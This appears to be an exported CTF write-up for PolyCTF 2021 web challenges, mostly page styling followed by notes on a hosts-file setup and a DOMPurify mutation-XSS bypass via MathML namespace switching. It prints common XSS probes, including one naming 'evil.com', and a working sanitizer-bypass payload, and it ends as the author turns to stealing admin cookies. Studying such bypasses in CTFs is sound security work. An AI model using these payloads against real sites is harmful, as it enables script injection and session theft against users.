@@ -1,0 +1,852 @@
+
+				<!DOCTYPE html>
+				<html>
+					<head>
+						<meta charset="UTF-8">
+						<link rel="stylesheet" href="pluginAssets/katex/katex.css"><script type="application/javascript" src="pluginAssets/mermaid/mermaid.min.js"></script><script type="application/javascript" src="pluginAssets/mermaid/mermaid_render.js"></script><link rel="stylesheet" href="pluginAssets/highlight.js/atom-one-light.css">
+						<title>PolyCTF 2021 </title>
+					</head>
+					<body>
+						<div class="exported-note"><div class="exported-note-title">PolyCTF 2021 </div>
+
+<style>
+		/* https://necolas.github.io/normalize.css/ */
+		html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}
+		article,aside,footer,header,nav,section{display:block}h1{font-size:2em;margin:.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}
+		pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent;-webkit-text-decoration-skip:objects}
+		b,strong{font-weight:bolder}small{font-size:80%}img{border-style:none}
+
+		body {
+			font-size: 15px;
+			color: #32373F;
+			word-wrap: break-word;
+			line-height: 1.6em;
+			background-color: #ffffff;
+			font-family: 'Avenir', 'Arial', sans-serif;
+			padding-bottom: 0px;
+			padding-top: 0px;
+		}
+		strong {
+			color: #000000;
+		}
+		kbd {
+			border: 1px solid rgb(220, 220, 220);
+			box-shadow: inset 0 -1px 0 rgb(220, 220, 220);
+			padding: 2px 4px;
+			border-radius: 3px;
+			background-color: rgb(243, 243, 243);
+		}
+		::-webkit-scrollbar {
+			width: 7px;
+			height: 7px;
+		}
+		::-webkit-scrollbar-corner {
+			background: none;
+		}
+		::-webkit-scrollbar-track {
+			border: none;
+		}
+		::-webkit-scrollbar-thumb {
+			background: rgba(100, 100, 100, 0.3); 
+			border-radius: 5px;
+		}
+		::-webkit-scrollbar-track:hover {
+			background: rgba(0, 0, 0, 0.1); 
+		}
+		::-webkit-scrollbar-thumb:hover {
+			background: rgba(100, 100, 100, 0.7); 
+		}
+
+		/* Remove top padding and margin from first child so that top of rendered text is aligned to top of text editor text */
+
+		#rendered-md > h1:first-child,
+		#rendered-md > h2:first-child,
+		#rendered-md > h3:first-child,
+		#rendered-md > h4:first-child,
+		#rendered-md > ul:first-child,
+		#rendered-md > ol:first-child,
+		#rendered-md > table:first-child,
+		#rendered-md > blockquote:first-child,
+		#rendered-md > img:first-child,
+		#rendered-md > p:first-child {
+			margin-top: 0;
+			padding-top: 0;
+		}
+		
+		p, h1, h2, h3, h4, h5, h6, ul, table {
+			margin-top: .6em;
+			margin-bottom: .65em;
+		}
+		h1, h2, h3, h4, h5, h6 {
+			line-height: 1.5em;
+		}
+		h1 {
+			font-size: 1.5em;
+			font-weight: bold;
+			border-bottom: 1px solid #dddddd;
+			padding-bottom: .3em;
+		}
+		h2 {
+			font-size: 1.3em;
+			font-weight: bold;
+			padding-bottom: .1em; */
+		}
+		h3 {
+			font-size: 1.1em;
+		}
+		h4, h5, h6 {
+			font-size: 1em;
+			font-weight: bold;
+		}
+
+		.exported-note-title {
+			font-size: 2em;
+			font-weight: bold;
+			margin-bottom: 0.8em;
+			line-height: 1.5em;
+			padding-bottom: .35em;
+			border-bottom: 1px solid #dddddd;
+		}
+
+		a {
+			color: #155BDA;
+		}
+		ul, ol {
+			padding-left: 0;
+			margin-left: 1.7em;
+		}
+		li {
+			margin-bottom: .4em;
+		}
+		li p {
+			margin-top: 0.2em;
+			margin-bottom: 0;
+		}
+		.resource-icon {
+			display: inline-block;
+			position: relative;
+			top: .5em;
+			text-decoration: none;
+			width: 1.2em;
+			height: 1.4em;
+			margin-right: 0.4em;
+			background-color:  #155BDA;
+		}
+    /* These icons are obtained from the wonderful ForkAwesome project by copying the src svgs 
+     * into the css classes below.
+     * svgs are obtained from https://github.com/ForkAwesome/Fork-Awesome/tree/master/src/icons/svg
+     * instead of the svg width, height property you must use a viewbox here, 0 0 1536 1792 is typically the actual size of the icon
+     * each line begins with the pre-amble -webkit-mask: url("data:image/svg+xml;utf8,
+     * and of course finishes with ");
+     * to precvent artifacts it is also necessary to include -webkit-mask-repeat: no-repeat;
+     * on the following line
+     * */
+		.fa-joplin {
+			/* Awesome Font file */
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M373.834 128C168.227 128 0 296.223 0 501.834v788.336C0 1495.778 168.227 1664 373.834 1664h788.336c205.608 0 373.83-168.222 373.83-373.83V501.834C1536 296.224 1367.778 128 1162.17 128zm397.222 205.431h417.424a7.132 7.132 0 0 1 7.132 7.133v132.552c0 4.461-3.619 8.073-8.077 8.073h-57.23c-24.168 0-43.768 19.338-44.284 43.374v2.377h-.017v136.191h-.053l-.466 509.375c-5.02 77.667-39.222 149.056-96.324 201.046-60.28 54.834-141.948 85.017-229.962 85.017-12.45 0-25.208-.61-37.907-1.785-92.157-8.682-181.494-48.601-251.662-112.438-71.99-65.517-117.147-150.03-127.164-238-11.226-98.763 23.42-192.783 95.045-257.937 81.99-74.637 198.185-101.768 316.613-75.704 5.574 1.227 9.55 6.282 9.55 11.997v199.52c-.199 2.625-1.481 6.599-8.183 2.896-.663-.365-1.194-.511-1.653-.531-21.987-10.587-45.159-17.57-68.559-19.916-.38-.04-.757-.124-1.138-.163-.537-.048-1.034-.033-1.556-.075-4.13-.354-8.183-.517-12.203-.58-.87-.011-1.771-.127-2.641-.127-.486 0-.951.05-1.437.057-1.464.011-2.886.115-4.33.163-2.76.102-5.497.211-8.182.448-.273.024-.547.07-.835.097-25.509 2.4-47.864 11.104-65.012 25.47-.954.802-1.974 1.53-2.9 2.36a1.34 1.34 0 0 1-.168.146c-23.96 21.8-34.881 53.872-30.726 90.316 4.62 40.737 26.94 81.156 62.841 113.823 35.908 32.67 80.335 52.977 125.113 57.186 35.118 3.36 66.547-3.919 89.899-20.461a97.255 97.255 0 0 0 9.365-7.501c2.925-2.661 5.569-5.5 8.086-8.416.3-.348.672-.673.975-1.024 8.253-9.864 14.222-21.067 17.996-33.148.639-2.034 1.051-4.148 1.564-6.227.381-1.563.81-3.106 1.112-4.693.555-2.784.923-5.632 1.253-8.49.086-.709.183-1.414.237-2.128.492-4.893.693-9.858.55-14.91h.013V521.623c-2.01-22.626-20.78-40.434-43.928-40.434h-57.23a8.071 8.071 0 0 1-8.077-8.073V340.564a7.132 7.132 0 0 1 7.136-7.133z'/></svg>");
+		}
+		.fa-file-image {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-128-448v320H256v-192l192-192 128 128 384-384zm-832-192c-106 0-192-86-192-192s86-192 192-192 192 86 192 192-86 192-192 192z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-pdf {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-514-593c25 20 53 38 84 56 42-5 81-7 117-7 67 0 152 8 177 49 7 10 13 28 2 52-1 1-2 3-3 4v1c-3 18-18 38-71 38-64 0-161-29-245-73-139 15-285 46-392 83-103 176-182 262-242 262-10 0-19-2-28-7l-24-12c-3-1-4-3-6-5-5-5-9-16-6-36 10-46 64-123 188-188 8-5 18-2 23 6 1 1 2 3 2 4 31-51 67-116 107-197 45-90 80-178 104-262-32-109-42-221-24-287 7-25 22-40 42-40h22c15 0 27 5 35 15 12 14 15 36 9 68-1 3-2 6-4 8 1 3 1 5 1 8v30c-1 63-2 123-14 192 35 105 87 190 146 238zm-576 411c30-14 73-57 137-158-75 58-122 124-137 158zm398-920c-10 28-10 76-2 132 3-16 5-31 7-44 2-17 5-31 7-43 1-3 2-5 4-8-1-1-1-3-2-5-1-18-7-29-13-36 0 2-1 3-1 4zm-124 661c88-35 186-63 284-81-10-8-20-15-29-23-49-43-93-103-127-176-19 61-47 126-83 197-15 28-30 56-45 83zm646-16c-5-5-31-24-140-24 49 18 94 28 124 28 9 0 14 0 18-1 0-1-1-2-2-3z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-word {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM233 768v107h70l164 661h159l128-485c5-15 8-30 10-46 1-8 2-16 2-24h4l3 24c3 14 4 30 9 46l128 485h159l164-661h70V768h-300v107h90l-99 438c-4 16-6 33-7 46l-2 21h-4c0-6-2-14-3-21-3-13-5-30-9-46L825 768H711l-144 545c-4 16-5 33-8 46l-4 21h-4l-2-21c-1-13-3-30-7-46l-99-438h90V768H233z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-powerpoint {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-992-234v106h327v-106h-93v-167h137c43 0 82-2 118-15 90-31 146-124 146-233s-54-193-137-228c-38-15-84-19-130-19H416v107h92v555h-92zm353-280H650V882h120c35 0 62 6 83 18 36 21 56 62 56 115 0 56-20 99-62 120-21 10-47 15-78 15z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-excel {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-979-234v106h281v-106h-75l103-161c12-19 18-34 21-34h2c1 4 3 7 5 10 4 8 10 14 17 24l107 161h-76v106h291v-106h-68l-192-273 195-282h67V768H828v107h74l-103 159c-12 19-21 34-21 33h-2c-1-4-3-7-5-10-4-7-9-14-17-23L648 875h76V768H434v107h68l189 272-194 283h-68z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-audio {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM620 850c12 5 20 17 20 30v544c0 13-8 25-20 30-4 1-8 2-12 2-8 0-16-3-23-9l-166-167H288c-18 0-32-14-32-32v-192c0-18 14-32 32-32h131l166-167c10-9 23-12 35-7zm417 689c19 0 37-8 50-24 83-102 129-231 129-363s-46-261-129-363c-22-28-63-32-90-10-28 23-32 63-9 91 65 80 100 178 100 282s-35 202-100 282c-23 28-19 68 9 90 12 10 26 15 40 15zm-211-148c17 0 34-7 47-20 56-60 87-137 87-219s-31-159-87-219c-24-26-65-27-91-3-25 24-27 65-2 91 33 36 52 82 52 131s-19 95-52 131c-25 26-23 67 2 91 13 11 29 17 44 17z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-video {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM768 768c70 0 128 58 128 128v384c0 70-58 128-128 128H384c-70 0-128-58-128-128V896c0-70 58-128 128-128h384zm492 2c12 5 20 17 20 30v576c0 13-8 25-20 30-4 1-8 2-12 2-8 0-17-3-23-9l-265-266v-90l265-266c6-6 15-9 23-9 4 0 8 1 12 2z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-archive {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M640 384V256H512v128h128zm128 128V384H640v128h128zM640 640V512H512v128h128zm128 128V640H640v128h128zm700-388c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H768v128H640V128H128v1536h1280zM781 943c85 287 107 349 107 349 5 17 8 34 8 52 0 111-108 192-256 192s-256-81-256-192c0-18 3-35 8-52 0 0 21-62 120-396V768h128v128h79c29 0 54 19 62 47zm-141 465c71 0 128-29 128-64s-57-64-128-64-128 29-128 64 57 64 128 64z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-code {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM480 768c11-14 31-17 45-6l51 38c14 11 17 31 6 45l-182 243 182 243c11 14 8 34-6 45l-51 38c-14 11-34 8-45-6l-226-301c-8-11-8-27 0-38zm802 301c8 11 8 27 0 38l-226 301c-11 14-31 17-45 6l-51-38c-14-11-17-31-6-45l182-243-182-243c-11-14-8-34 6-45l51-38c14-11 34-8 45 6zm-620 461c-18-3-29-20-26-37l138-831c3-18 20-29 37-26l63 10c18 3 29 20 26 37l-138 831c-3 18-20 29-37 26z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-alt, .fa-file-csv {
+      /* fork-awesome doesn't have csv so we use the text icon */
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM384 800c0-18 14-32 32-32h704c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64zm736 224c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64c0-18 14-32 32-32h704zm0 256c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64c0-18 14-32 32-32h704z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		blockquote {
+			border-left: 4px solid rgb(220, 220, 220);
+			padding-left: 1.2em;
+			margin-left: 0;
+			opacity: .7;
+		}
+
+		.jop-tinymce table,
+		table {
+			text-align: left;
+			border-collapse: collapse;
+			border: 1px solid rgb(220, 220, 220);
+			background-color: #ffffff;
+		}
+
+		.jop-tinymce table td, .jop-tinymce table th,
+		table td, th {
+			text-align: left;
+			padding: .5em 1em .5em 1em;
+			font-size: 15;
+			color: #32373F;
+			font-family: 'Avenir', 'Arial', sans-serif;
+		}
+
+		.jop-tinymce table td,
+		table td {
+			border: 1px solid rgb(220, 220, 220);
+		}
+
+		.jop-tinymce table th,
+		table th {
+			border: 1px solid rgb(220, 220, 220);
+			border-bottom: 2px solid rgb(220, 220, 220);
+			background-color: rgb(247, 247, 247);
+		}
+
+		.jop-tinymce table tr:nth-child(even),
+		table tr:nth-child(even) {
+			background-color: rgb(247, 247, 247);
+		}
+
+		.jop-tinymce table tr:hover,
+		table tr:hover {
+			background-color: #e5e5e5;
+		}
+
+		hr {
+			border: none;
+			border-bottom: 2px solid #dddddd;
+		}
+		img {
+			max-width: 100%;
+			height: auto;
+		}
+		
+		.inline-code,
+		.mce-content-body code {
+			border: 1px solid rgb(220, 220, 220);
+			background-color: rgb(243, 243, 243);
+			padding-right: .2em;
+			padding-left: .2em;
+			border-radius: .25em;
+			color: rgb(0,0,0);
+			font-size: .9em;
+		}
+
+		.highlighted-keyword {
+			background-color: #F3B717;
+			color: black;
+		}
+
+		.not-loaded-resource img {
+			width: 1.15em;
+			height: 1.15em;
+			background: white;
+			padding: 2px !important;
+			border-radius: 2px;
+			box-shadow: 0 1px 3px #000000aa;
+		}
+
+		a.not-loaded-resource img {
+			margin-right: .2em;
+		}
+
+		a.not-loaded-resource {
+			display: flex;
+			flex-direction: row;
+			align-items: center;
+		}
+
+		.md-checkbox input[type=checkbox]:checked {
+			opacity: 0.7;
+		}
+
+		.jop-tinymce ul.joplin-checklist .checked,
+		.md-checkbox .checkbox-label-checked {
+			opacity: 0.5;
+		}
+
+		.exported-note {
+			padding: 1em;
+		}
+
+		.joplin-editable .joplin-source {
+			display: none;
+		}
+
+		/* =============================================== */
+		/* For TinyMCE */
+		/* =============================================== */
+
+		.mce-content-body {
+			/* Note: we give a bit more padding at the bottom, to allow scrolling past the end of the document */
+			padding: 5px 10px 10em 0;
+		}
+
+		/*
+		.mce-content-body code {
+			background-color: transparent;
+		}
+		*/
+
+		.mce-content-body [data-mce-selected=inline-boundary] {
+			background-color: transparent;
+		}
+
+		.mce-content-body .joplin-editable {
+			cursor: pointer !important;
+		}
+
+		.mce-content-body.mce-content-readonly {
+			opacity: 0.5;
+		}
+
+		/* We need that to make sure click events have the A has a target */
+		.katex a span {
+			pointer-events: none;
+		}
+
+		.media-player {
+			width: 100%;
+			margin-top: 10px;
+		}
+
+		.media-player.media-pdf {
+			min-height: 100vh;
+		}
+
+		/* Clear the CODE style if the element is within a joplin-editable block */
+		.mce-content-body .joplin-editable code {
+			border: none;
+			background: none;
+			padding: 0;
+			color: inherit;
+			font-size: inherit;
+		}
+
+		/* =============================================== */
+		/* For TinyMCE */
+		/* =============================================== */
+
+		@media print {
+			body {
+				height: auto !important;
+			}
+
+			pre {
+				white-space: pre-wrap;
+			}
+
+			.code, .inline-code {
+				border: 1px solid #CBCBCB;
+			}
+
+			#joplin-container-content {
+				/* The height of the content is set dynamically by JavaScript (in updateBodyHeight) to go
+				   around various issues related to scrolling. However when printing we don't want this
+				   fixed size as that would crop the content. So we set it to auto here. "important" is
+				   needed to override the style set by JavaScript at the element-level. */
+				height: auto !important;
+			}
+		}
+	
+
+				/*
+					FOR THE MARKDOWN EDITOR
+				*/
+
+				/* Remove the indentation from the checkboxes at the root of the document
+				   (otherwise they are too far right), but keep it for their children to allow
+				   nested lists. Make sure this value matches the UL margin. */
+
+				li.md-checkbox {
+					list-style-type: none;
+				}
+
+				li.md-checkbox input[type=checkbox] {
+					margin-left: -1.71em;
+					margin-right: 0.7em;
+				}
+				
+				ul.joplin-checklist {
+					list-style:none;
+				}
+
+				/*
+					FOR THE RICH TEXT EDITOR
+				*/
+
+				ul.joplin-checklist li::before {
+					content:"\f14a";
+					font-family:"Font Awesome 5 Free";
+					background-size: 16px 16px;
+					pointer-events: all;
+					cursor: pointer;
+					width: 1em;
+					height: 1em;
+					margin-left: -1.3em;
+					position: absolute;
+					color: #32373F;
+				}
+
+				.joplin-checklist li:not(.checked)::before {
+					content:"\f0c8";
+				}
+.mermaid { background-color: white; width: 640px; }</style><div id="rendered-md"><h6 id="20-02-2021-online-jeopardy">20-02-2021 | Online | Jeopardy</h6>
+<h6 id="organizers-polyhx-polytechnique-montreal">Organizers : PolyHx (Polytechnique Montreal)</h6>
+<h6 id="final-placement-17th">Final placement: 17th</h6>
+<p><img src="_resources/23d9535e44d74cb8877c0037efd70ab1.png" alt="5a351d5ecdcf53f6e2822a516da1cced.png"></p>
+<h1 id="web">Web</h1>
+<h2 id="timeio">TIMEIO</h2>
+<p>For this challenge, since it's using an unknown host (time.ctf), we need to add it to our hosts list:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="shell" data-joplin-source-open="```shell&#10;" data-joplin-source-close="&#10;```">&gt; cat /etc/hosts
+
+# Static table lookup for hostnames.
+# See hosts(5) for details.
+127.0.0.1	localhost
+::1		localhost
+127.0.1.1	arch.localdomain	arch # I use arch btw
+
+3.141.95.219 	time.ctf</pre><pre class="hljs"><code><span class="hljs-meta">&gt;</span><span class="bash"> cat /etc/hosts</span>
+<span class="hljs-meta">
+#</span><span class="bash"> Static table lookup <span class="hljs-keyword">for</span> hostnames.</span>
+<span class="hljs-meta">#</span><span class="bash"> See hosts(5) <span class="hljs-keyword">for</span> details.</span>
+127.0.0.1	localhost
+::1		localhost
+127.0.1.1	arch.localdomain	arch # I use arch btw
+
+3.141.95.219 	time.ctf</code></pre></div>
+<p>The flag is on the very bottom of the source code:</p>
+<h2 id="formula">Formula</h2>
+<p>The challenge specs were as follows:</p>
+<blockquote>
+<p>Mathematicians are not the best web developpers...</p>
+</blockquote>
+<p>If we enter the website we see a page that displays a mathematic formula (written in <a data-from-md title='https://developer.mozilla.org/en-US/docs/Web/MathML' href='https://developer.mozilla.org/en-US/docs/Web/MathML'>MathML</a>), as well as an input box asking us to rewrite something like that formula above.</p>
+<p>If we snoop around the dev tools, we also see that we are given a cookie upon entering the page: <code class="inline-code">secret=here</code></p>
+<p>Also, if we enter something in the input box and send the result. It will redirect to a page containing the parsed HTML inputted and another button stating something along the lines of showing this to our admins, further solidifying the idea that this is indeed an XSS challenge.</p>
+<p>Right off the bat, if we're given an input box, we should try to test some common XSS payloads:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src onerror=&quot;alert(1)&quot;&gt;
+&lt;embed src=&quot;evil.com&quot;&gt;
+...</pre><pre class="hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;evil.com&quot;</span>&gt;</span>
+...</code></pre></div>
+<p>However, all of the inputs were being sanitized properly with the possible xss elements either being stripped of their potential dangerous parameters  or completely removed from the DOM. It was possible however, to input tags, since things like <code class="inline-code">&lt;button&gt;</code> or other form of markdown worked.</p>
+<p>Furthermore, since the challenge asked to recreate the formula written, it could have to do with MathML.</p>
+<p>After trying a bunch of things, I managed to find some more information on MathML.</p>
+<p>In essence, MathML falls in the same category as SVG whereby it changes the namespace of the elements generated in the HTML by the parser. The HTML Parser creates elements based on three namespaces, that of html, svg and mathml.</p>
+<p>On top of that, this challenges uses DOMPurify to sanitize the inputs and this is where the attack vector is.</p>
+<p>The way DOMPurify works is, simply put, as follows:</p>
+<p>The HTML is parsed -&gt; DOMPurify sanitizes it -&gt; Reparsed (parsing ➡️ serialization ➡️ parsing)</p>
+<p>However, the problem with that is that it's possible that the sanitzed DOM differs and ruins the integrity of the initial parsed HTML, which then could imply the possibility of a mutated XSS attack.</p>
+<p><a data-from-md title='https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/' href='https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/'>A lot more can be read here about the attack vector</a></p>
+<p>Now, the idea of switching namespaces comes into play here. Because we're handling DOM elements from different namespaces, they will be parsed differently. Meaning that something like this for example: <code class="inline-code">&lt;style&gt;&lt;a&gt;ABC&lt;/style&gt;&lt;svg&gt;&lt;style&gt;&lt;a&gt;ABC</code><br>
+could result in a DOM like this:<br>
+<img src="_resources/3f5d5cbd7dc2413bbd60c3ab68204a17.png" alt="97458dab21b3d12d35003d10d1a22e86.png"></p>
+<p>(Also all of this is from the link previously provided)</p>
+<p>In the image, we see that the svg contains an svg style with an svg anchor, yet those are not real html elements. They were incorrectly parsed after being serialized by DOMPurify.</p>
+<p>Knowing this, we need to also understand that there are elements in the different namespaces that force the parser to switch back to the HTML namespace, elements such as <code class="inline-code">mtext</code> in MathML. This makes it possible to possible to generate contents of different namespaces, when nested within elements of another namespace</p>
+<p>Finally, the article also provides a payload:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;mglyph&gt;&lt;style&gt;&lt;/math&gt;&lt;img src onerror=alert(1)&gt;</pre><pre class="hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">math</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mtext</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mglyph</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">math</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span></span></code></pre></div>
+<p>If we analyze this, it is creating a DOMTree as such:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="html" data-joplin-source-open="```html&#10;" data-joplin-source-close="&#10;```">&lt;form&gt;
+    &lt;math&gt;
+        &lt;mtext&gt;
+            &lt;html form&gt;
+                &lt;html mglyph&gt;
+                    &lt;html style&gt;
+                        text
+                        &lt;/math&gt;
+                    &lt;img src onerror=&quot;alert(1)&quot;&gt;</pre><pre class="hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">math</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">mtext</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">form</span>&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">mglyph</span>&gt;</span>
+                    <span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">style</span>&gt;</span>
+                        text
+                        <span class="hljs-tag">&lt;/<span class="hljs-name">math</span>&gt;</span>
+                    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span></code></pre></div>
+<p><strong>Why this works</strong>:</p>
+<p>This works, because every element in the DOMPurify <em>allow list</em> are respected, since the serialization doesnt take into account the <code class="inline-code">&lt;img src onerror=&quot;alert(1)&quot;&gt;</code>, because in this payload, it is serialized as text and not as an html element, because of the namespace switching.</p>
+<h3 id="tldr">TLDR :</h3>
+<p>Because the page sanitizes the inputs that contain possible xss enabling parameters, it uses some sort of sanitizer like DOMPurify. DOMPurify however induces a vulnerability where sanitized HTML is not parsed the same way as it was initially parsed, introducing the possibility of mutated XSS attacks through DOM manipulation using HTML elements of different namespaces, in this case MathML.</p>
+<p>If we enter this payload, we indeed get script executed, since an alert box does pop up. Great, now we need to find the flag. Often times, the flag will be in the cookies of the victim, in this case the admins of the website. Also, the cookie that we have states <code class="inline-code">secret=here</code>, which also proves the idea that we need the victims cookies.</p>
